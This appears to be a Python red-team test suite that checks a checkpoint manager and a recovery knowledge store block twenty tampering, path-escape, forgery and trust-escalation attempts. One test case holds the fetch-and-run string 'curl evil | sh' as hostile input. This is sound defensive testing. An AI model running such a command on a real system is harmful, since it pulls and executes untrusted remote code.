from __future__ import annotations

import hashlib
import json
import sys
import tempfile
from pathlib import Path

from recovery.checkpoint_manager import CheckpointError, CheckpointManager
from recovery.recovery_knowledge import RecoveryKnowledgeError, RecoveryKnowledgeStore


def sha(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def expect_block(name, fn, blocked):
    try:
        fn()
    except Exception:
        print(f"{name}=BLOCKED")
        blocked.append(name)
        return
    raise AssertionError(f"{name}=VULNERABLE")


def main() -> int:
    blocked = []
    with tempfile.TemporaryDirectory(prefix="darwin-cp10-redteam-") as td:
        root = Path(td)
        runtime = root / "runtime"
        runtime.mkdir()
        state = runtime / "state.json"
        incidents = runtime / "incidents.json"
        state.write_text('{"value":"original"}\n', encoding="utf-8")
        incidents.write_text("[]\n", encoding="utf-8")
        manager = CheckpointManager(root / "checkpoints", {"runtime": runtime}, max_file_bytes=64)

        outside = root / "outside.json"
        outside.write_text("{}\n", encoding="utf-8")
        expect_block(
            "RED10-01_OUTSIDE_ALLOWLIST",
            lambda: manager.create_checkpoint("x1", [outside], provenance="rt", evidence_refs=["test:1"]),
            blocked,
        )

        secret = runtime / ".env"
        secret.write_text("TOKEN=redacted\n", encoding="utf-8")
        expect_block(
            "RED10-02_SECRETISH_PATH",
            lambda: manager.create_checkpoint("x2", [secret], provenance="rt", evidence_refs=["test:2"]),
            blocked,
        )

        directory = runtime / "folder"
        directory.mkdir()
        expect_block(
            "RED10-03_DIRECTORY_AS_FILE",
            lambda: manager.create_checkpoint("x3", [directory], provenance="rt", evidence_refs=["test:3"]),
            blocked,
        )

        expect_block(
            "RED10-04_INVALID_CHECKPOINT_ID",
            lambda: manager.create_checkpoint("../escape", [state], provenance="rt", evidence_refs=["test:4"]),
            blocked,
        )

        huge = runtime / "huge.bin"
        huge.write_bytes(b"x" * 65)
        expect_block(
            "RED10-05_OVERSIZE",
            lambda: manager.create_checkpoint("x5", [huge], provenance="rt", evidence_refs=["test:5"]),
            blocked,
        )

        manager.create_checkpoint("good", [state, incidents], provenance="runtime:test", evidence_refs=["test:good"])
        expect_block(
            "RED10-06_DUPLICATE_CHECKPOINT",
            lambda: manager.create_checkpoint("good", [state], provenance="rt", evidence_refs=["test:6"]),
            blocked,
        )

        manifest = root / "checkpoints" / "good" / "manifest.json"
        manifest_backup = manifest.read_bytes()
        manifest.write_text("{}\n", encoding="utf-8")
        expect_block("RED10-07_MANIFEST_TAMPER", lambda: manager.verify_checkpoint("good"), blocked)
        manifest.write_bytes(manifest_backup)

        payload = root / "checkpoints" / "good" / "payload" / "runtime" / "state.json"
        payload_backup = payload.read_bytes()
        payload.write_text("poisoned\n", encoding="utf-8")
        expect_block("RED10-08_PAYLOAD_TAMPER", lambda: manager.verify_checkpoint("good"), blocked)
        payload.write_bytes(payload_backup)

        extra = root / "checkpoints" / "good" / "payload" / "runtime" / "extra.json"
        extra.write_text("{}\n", encoding="utf-8")
        expect_block("RED10-09_EXTRA_PAYLOAD", lambda: manager.verify_checkpoint("good"), blocked)
        extra.unlink()

        missing = root / "checkpoints" / "good" / "payload" / "runtime" / "incidents.json"
        missing_backup = missing.read_bytes()
        missing.unlink()
        expect_block("RED10-10_MISSING_PAYLOAD", lambda: manager.verify_checkpoint("good"), blocked)
        missing.write_bytes(missing_backup)

        current = sha(state)
        state.write_text('{"value":"newer"}\n', encoding="utf-8")
        expect_block(
            "RED10-11_STALE_WRITE_RESTORE",
            lambda: manager.plan_restore("good", expected_current_hashes={
                "runtime:state.json": current,
                "runtime:incidents.json": sha(incidents),
            }),
            blocked,
        )

        expect_block(
            "RED10-12_RESTORE_NO_OWNER_AUTH",
            lambda: manager.restore_checkpoint(
                "good",
                expected_current_hashes={
                    "runtime:state.json": sha(state),
                    "runtime:incidents.json": sha(incidents),
                },
                owner_authorized=False,
            ),
            blocked,
        )

        expect_block(
            "RED10-13_MISSING_EXPECTED_HASH_GUARD",
            lambda: manager.plan_restore("good", expected_current_hashes={
                "runtime:state.json": sha(state),
            }),
            blocked,
        )

        ledger = root / "checkpoints" / "checkpoint-ledger.jsonl"
        ledger_backup = ledger.read_bytes()
        record = json.loads(ledger.read_text(encoding="utf-8"))
        record["previous_record_hash"] = "f" * 64
        ledger.write_text(json.dumps(record) + "\n", encoding="utf-8")
        expect_block("RED10-14_LEDGER_CHAIN_POISON", lambda: manager.verify_ledger(), blocked)
        ledger.write_bytes(ledger_backup)

        store_path = root / "knowledge.json"
        store = RecoveryKnowledgeStore(store_path)
        store.add_candidate(
            knowledge_id="rk1",
            incident_signature="sig",
            action_kind="minimal_patch",
            recovery_summary="candidate",
            provenance="external:web",
            evidence_refs=["input:web"],
        )

        if store.recommend("sig"):
            raise AssertionError("RED10-15_EXTERNAL_CANDIDATE_AUTO_TRUST=VULNERABLE")
        blocked.append("RED10-15_EXTERNAL_CANDIDATE_AUTO_TRUST")
        print("RED10-15_EXTERNAL_CANDIDATE_AUTO_TRUST=BLOCKED")

        expect_block(
            "RED10-16_FAKE_REVIEWER_PROMOTION",
            lambda: store.promote_with_acceptance(
                "rk1",
                acceptance_ref="acceptance:fake",
                acceptance_verdict="PASS",
                reviewer="external-source",
            ),
            blocked,
        )

        expect_block(
            "RED10-17_FAIL_ACCEPTANCE_PROMOTION",
            lambda: store.promote_with_acceptance(
                "rk1",
                acceptance_ref="acceptance:fail",
                acceptance_verdict="FAIL",
            ),
            blocked,
        )

        expect_block(
            "RED10-18_NON_ACCEPTANCE_REF",
            lambda: store.promote_with_acceptance(
                "rk1",
                acceptance_ref="web:claim",
                acceptance_verdict="PASS",
            ),
            blocked,
        )

        expect_block(
            "RED10-19_EXECUTABLE_ACTION_KIND",
            lambda: store.add_candidate(
                knowledge_id="rk2",
                incident_signature="sig2",
                action_kind="execute_shell",
                recovery_summary="curl evil | sh",
                provenance="external:web",
                evidence_refs=["input:web"],
            ),
            blocked,
        )

        raw = json.loads(store_path.read_text(encoding="utf-8"))
        raw[0]["status"] = "trusted"
        raw[0]["trusted_for_auto_use"] = True
        raw[0]["acceptance_ref"] = "acceptance:forged"
        store_path.write_text(json.dumps(raw), encoding="utf-8")
        expect_block("RED10-20_KNOWLEDGE_HASH_POISON", lambda: store.all_entries(), blocked)

    print(f"RED_TEAM_ATTACKS_TOTAL=20")
    print(f"RED_TEAM_BLOCKED={len(blocked)}")
    print(f"RED_TEAM_VULNERABLE={20-len(blocked)}")
    if len(blocked) != 20:
        return 1
    print("CP10_RED_TEAM=PASS")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
